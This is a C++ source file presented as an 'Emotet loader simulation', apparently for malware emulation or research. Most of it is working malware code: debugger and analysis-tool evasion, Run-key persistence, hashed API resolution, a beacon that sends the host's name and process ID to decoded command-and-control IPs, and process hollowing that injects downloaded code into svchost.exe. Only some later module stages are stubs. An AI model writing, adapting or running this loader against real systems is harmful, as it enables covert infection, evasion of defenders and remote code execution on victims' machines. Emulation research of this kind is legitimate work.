/**
 * main.cpp - Emotet Loader Simulation
 * Entry point for the Emotet simulation - mirrors the multi-stage infection flow
 */
#include <windows.h>
#include <winhttp.h>
#include <string.h>
#include "config.h"
#ifdef _MSC_VER
#pragma comment(lib, "winhttp.lib")
#endif

// Forward declarations
BOOL DecodeC2List(char* outputBuffer, int* portList);
BOOL DownloadModules(int c2Index, const EMOTET_RUNTIME_CONFIG* runtimeConfig);
BOOL InjectModule(LPVOID moduleData, SIZE_T moduleSize);
void DispatchRecoveredModules(const EMOTET_RUNTIME_CONFIG* runtimeConfig);

typedef VOID (WINAPI *SleepFn)(DWORD);
typedef LPVOID (WINAPI *VirtualAllocExFn)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI *WriteProcessMemoryFn)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

/**
 * Entry point - mirrors Emotet's main execution flow
 * Real Emotet checks command line args for "/C", "/W", "/I", "/P" flags [citation:2]
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    EMOTET_RUNTIME_CONFIG runtimeConfig;
    SleepFn pSleep = (SleepFn)ResolveKernel32ApiByHash(HASH_SLEEP);

    if (!pSleep) {
        pSleep = Sleep;
    }

    DecodeEmbeddedConfig(&runtimeConfig);

    // Anti-analysis checks (real Emotet does these early) [citation:1]
    if (IsDebuggerPresent_Emotet()) {
        // Decoy behavior - exit cleanly to avoid suspicion
        return 0;
    }
    
    if (IsHypervisorOverhead()) {
        // Sleep to evade sandbox timeouts
        pSleep(GetSleepJitterMilliseconds(runtimeConfig.sleepSeconds));  // RC4 config controls the base interval
    }
    
    // Check for analysis tools via window enumeration
    HWND hDbgWin = FindWindowA("OllyDbg", NULL);
    if (!hDbgWin) hDbgWin = FindWindowA("WinDbgFrameClass", NULL);
    if (!hDbgWin) hDbgWin = FindWindowA("x64dbg", NULL);
    if (hDbgWin) {
        ExitProcess(0);
    }
    if (CheckAnalysisProcesses()) {
        ExitProcess(0);
    }
    
    // Persistence installation - mirrors Emotet's registry persistence [citation:2]
    HKEY hKey;
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    
    if (RegCreateKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
        RegCloseKey(hKey);
    }
    
    // Decode C2 list (real Emotet: per-server decoder functions) [citation:1]
    char c2Servers[3][64];
    int c2Ports[3];
    DecodeC2List((char*)c2Servers, c2Ports);
    
    // C2 communication loop - tries each server sequentially
    // Mirrors Emotet's /mult/[random] POST pattern [citation:6]
    for (int i = 0; i < 3; i++) {
        if (DownloadModules(i, &runtimeConfig)) {
            DispatchRecoveredModules(&runtimeConfig);
            break;  // Successfully received modules
        }
        // Exponential backoff between C2 attempts
        pSleep(GetSleepJitterMilliseconds((i + 1) * runtimeConfig.sleepSeconds));
    }
    
    // Persist by staying resident
    while (TRUE) {
        pSleep(GetSleepJitterMilliseconds(runtimeConfig.sleepSeconds * 10));  // Beacon every ~20 minutes with jitter
    }
    return 0;
}

/**
 * C2 Communication - Simulates Emotet's encrypted HTTP POST protocol
 * Real Emotet uses AES-128-CBC + RSA for session key exchange [citation:6]
 */
BOOL DownloadModules(int c2Index, const EMOTET_RUNTIME_CONFIG* runtimeConfig) {
    // Decode C2 address (in real Emotet, this is per-server function)
    DWORD encodedIP = ENCODED_C2_LIST[c2Index];
    DWORD ipAddr = MbaDecodeDword(encodedIP);
    
    // Build HTTP request structure matching Emotet's /mult/[path] POST [citation:6]
    HINTERNET hSession = WinHttpOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Trident/4.0)",
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    
    if (!hSession) return FALSE;
    
    // Build C2 URI (real Emotet generates random paths like /mult/vermont/odbc)
    WCHAR szHost[64];
    wsprintfW(szHost, L"%d.%d.%d.%d", 
              (ipAddr >> 24) & 0xFF, (ipAddr >> 16) & 0xFF,
              (ipAddr >> 8) & 0xFF, ipAddr & 0xFF);
    
    HINTERNET hConnect = WinHttpConnect(hSession, szHost, 7080, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }
    
    // Generate random variable name for POST data (Emotet pattern) [citation:6]
    WCHAR szPath[64];
    wsprintfW(szPath, L"/mult/vermont/odbc");
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", szPath,
                                             NULL, WINHTTP_NO_REFERER,
                                             WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    
    if (hRequest) {
        // Build protobuf-like host info structure [citation:6]
        char botId[64];
        DWORD cbBotId = sizeof(botId);
        GetComputerNameA(botId, &cbBotId);
        
        // Emotet sends: scmanager, bot_id, arch, session_id, file_crc32, process_list
        char hostInfo[512];
        wsprintfA(hostInfo,
                  "scmanager:1|bot_id:%s|arch:x64|session:%d|campaign:%s|install:%s|crc:%08X",
                  botId,
                  GetCurrentProcessId(),
                  runtimeConfig ? runtimeConfig->campaign : "EM-2024-A",
                  runtimeConfig ? runtimeConfig->installPath : "%APPDATA%\\msvc_svc.exe",
                  0xDEADBEEF);
        
        // In real Emotet: zlib compress -> AES encrypt -> RSA encrypt key -> base64 [citation:6]
        // Here we simulate the structure without actual crypto
        
        WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\nDNT: 1\r\n",
                           -1, hostInfo, strlen(hostInfo), strlen(hostInfo), 0);
        
        WinHttpReceiveResponse(hRequest, NULL);
        
        // Process response - real Emotet returns PE modules in C2Response protobuf
        BYTE responseBuffer[8192];
        DWORD bytesRead;
        WinHttpReadData(hRequest, responseBuffer, sizeof(responseBuffer), &bytesRead);
        
        if (bytesRead > 0x1000) {
            // Simulate module extraction and injection
            // Real Emotet modules are DLLs loaded reflectively
            InjectModule(responseBuffer, bytesRead);
        }
        
        WinHttpCloseHandle(hRequest);
    }
    
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return TRUE;
}

/**
 * Process Hollowing - Standard Emotet injection technique [citation:2]
 * Creates suspended process and replaces its memory with payload
 */
BOOL InjectModule(LPVOID moduleData, SIZE_T moduleSize) {
    VirtualAllocExFn pVirtualAllocEx =
        (VirtualAllocExFn)ResolveKernel32ApiByHash(HASH_VIRTUALALLOCEX);
    WriteProcessMemoryFn pWriteProcessMemory =
        (WriteProcessMemoryFn)ResolveKernel32ApiByHash(HASH_WRITEPROCESSMEMORY);
    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    CONTEXT ctx = {};
    si.cb = sizeof(si);
    ctx.ContextFlags = CONTEXT_FULL;
    char targetCmd[] = "C:\\Windows\\System32\\svchost.exe -k netsvcs";
    
    // Create suspended process (real Emotet uses regsvr32.exe or svchost.exe) [citation:2]
    if (!CreateProcessA(NULL, targetCmd,
                        NULL, NULL, FALSE, CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    // Get thread context to find entry point
    GetThreadContext(pi.hThread, &ctx);
    
    // Allocate memory in target
    if (!pVirtualAllocEx) {
        pVirtualAllocEx = VirtualAllocEx;
    }
    if (!pWriteProcessMemory) {
        pWriteProcessMemory = WriteProcessMemory;
    }
    LPVOID remoteMem = pVirtualAllocEx(pi.hProcess, NULL, moduleSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Write payload
    if (!remoteMem || !pWriteProcessMemory(pi.hProcess, remoteMem, moduleData, moduleSize, NULL)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }
    
    // Update entry point and resume
    ctx.Rcx = (DWORD64)remoteMem;  // x64 calling convention: RCX = entry param
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

/**
 * Decodes the C2 server list
 * Real Emotet: each IP/port pair has dedicated decoder function with MBA [citation:10]
 */
BOOL DecodeC2List(char* outputBuffer, int* portList) {
    for (int i = 0; ENCODED_C2_LIST[i] != 0; i++) {
        DWORD decoded = MbaDecodeDword(ENCODED_C2_LIST[i]);
        wsprintfA(&outputBuffer[i * 64], "%d.%d.%d.%d",
                  (decoded >> 24) & 0xFF, (decoded >> 16) & 0xFF,
                  (decoded >> 8) & 0xFF, decoded & 0xFF);
        portList[i] = 7080 + (decoded & 0xFF);
    }
    return TRUE;
}

void DispatchRecoveredModules(const EMOTET_RUNTIME_CONFIG* runtimeConfig) {
    struct EmotetModulePlan {
        DWORD moduleId;
        const char* moduleName;
    };
    static const EmotetModulePlan modulePlan[] = {
        {MODULE_SPAM, "spam_dispatch"},
        {MODULE_OUTLOOK, "outlook_harvest"},
        {MODULE_CREDENTIALS, "credential_cache"},
        {MODULE_NETSPREADER, "netspread_stage"},
    };

    for (int i = 0; i < (int)(sizeof(modulePlan) / sizeof(modulePlan[0])); i++) {
        switch (modulePlan[i].moduleId) {
        case MODULE_SPAM: {
            HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE,
                                         runtimeConfig ? runtimeConfig->campaign : "EM-2024-A");
            if (hEvent) {
                CloseHandle(hEvent);
            }
            break;
        }
        case MODULE_OUTLOOK: {
            HKEY hKey;
            if (RegCreateKeyExA(HKEY_CURRENT_USER,
                                "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles",
                                0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                RegSetValueExA(hKey, "EmotetCampaign", 0, REG_SZ,
                               (const BYTE*)(runtimeConfig ? runtimeConfig->campaign : "EM-2024-A"),
                               lstrlenA(runtimeConfig ? runtimeConfig->campaign : "EM-2024-A") + 1);
                RegCloseKey(hKey);
            }
            break;
        }
        case MODULE_CREDENTIALS: {
            HANDLE hHeap = HeapCreate(0, 0, 0);
            if (hHeap) {
                SIZE_T installPathLength = lstrlenA(runtimeConfig ? runtimeConfig->installPath : "%APPDATA%\\msvc_svc.exe") + 1;
                LPSTR heapCopy = (LPSTR)HeapAlloc(hHeap, 0, installPathLength);
                if (heapCopy) {
                    lstrcpynA(heapCopy,
                              runtimeConfig ? runtimeConfig->installPath : "%APPDATA%\\msvc_svc.exe",
                              (int)installPathLength);
                    HeapFree(hHeap, 0, heapCopy);
                }
                HeapDestroy(hHeap);
            }
            break;
        }
        case MODULE_NETSPREADER: {
            HANDLE hMutex = CreateMutexA(NULL, FALSE, modulePlan[i].moduleName);
            if (hMutex) {
                CloseHandle(hMutex);
            }
            break;
        }
        }
    }
}
